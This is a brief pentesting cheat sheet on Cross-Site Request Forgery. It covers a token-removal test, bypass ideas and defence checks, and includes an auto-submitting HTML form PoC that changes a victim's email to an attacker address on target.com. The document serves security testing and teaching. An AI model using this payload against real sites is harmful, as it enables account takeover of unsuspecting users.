# 🔐 CSRF Cheatsheet

> Practical testing methodology for Cross-Site Request Forgery

---

## 🎯 Core Concept

CSRF = Force victim to perform actions using their session

---

## 🔍 What to Look For

* State-changing requests:

  * Change password
  * Change email
  * Transfer money

---

## ⚡ Basic Test

1. Capture request:

```http
POST /change-email
Cookie: session=xyz
```

2. Remove CSRF token → resend

👉 If still works → vulnerable

---

## 💣 PoC (Proof of Concept)

```html
<form action="https://target.com/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@mail.com">
</form>

<script>
document.forms[0].submit();
</script>
```

---

## 🧠 Bypass Techniques

* Remove token
* Change token
* Use GET instead of POST
* Check SameSite cookies

---

## 🚨 Indicators

* No CSRF token
* Token not validated
* Token predictable

---

## 🛡️ Defense Check

* CSRF token present?
* Token tied to session?
* SameSite cookie enabled?
